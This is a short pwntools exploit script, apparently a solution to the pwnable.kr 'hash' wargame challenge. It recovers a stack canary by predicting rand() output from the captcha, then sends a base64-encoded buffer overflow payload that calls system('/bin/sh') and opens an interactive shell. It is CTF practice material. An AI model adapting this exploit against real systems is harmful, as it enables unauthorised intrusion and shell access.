from pwn import *
import ctypes
import base64

# p = process('./hash')
p = remote('pwnable.kr', 9002)
r = process('./rand')

num = [0,0,0,0,0,0,0,0]
for i in range(8):
    num[i] = int(r.recvline().strip())
p.recvuntil('captcha : ')
captcha = int(p.recvline().strip())
canary = captcha - num[4] + num[6] - num[7] - num[2] + num[3] - num[1] - num[5]
canary = ctypes.c_uint(canary).value
success('canary = 0x%x', canary)
p.sendline(str(captcha))
system = 0x8048880
payload = b'a'*0x200 + p32(canary) + b'aaaaaaaaaaaa' + p32(system) + p32(0xdeadbeef) + p32(0x804b3b0)
payload = base64.b64encode(payload) + b'/bin/sh\x00'
p.sendlineafter('me!', payload)

p.interactive()